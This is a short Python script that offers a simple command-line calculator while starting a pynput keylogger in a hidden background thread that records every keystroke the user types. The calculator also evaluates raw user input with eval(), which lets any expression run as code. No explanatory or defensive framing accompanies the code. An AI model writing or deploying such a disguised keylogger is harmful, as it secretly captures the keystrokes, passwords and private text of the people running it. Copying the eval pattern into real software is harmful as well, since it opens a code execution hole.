from pynput.keyboard import Listener

# Function to handle key press event
def on_press(key):
    try:
        print(f"Key pressed: {key.char}")
    except AttributeError:
        print(f"Special key pressed: {key}")

# Function to start listening to the keyboard
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def calculator():
    print("Simple Calculator")
    print("Enter 'exit' to quit.")
    while True:
        try:
            expr = input("Enter an expression (e.g., 2 + 2): ")
            if expr.lower() == 'exit':
                print("Exiting calculator...")
                break
            result = eval(expr)
            print(f"Result: {result}")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    # Run the keylogger in the background while the calculator is active
    from threading import Thread
    keylogger_thread = Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

    # Start the calculator
    calculator()
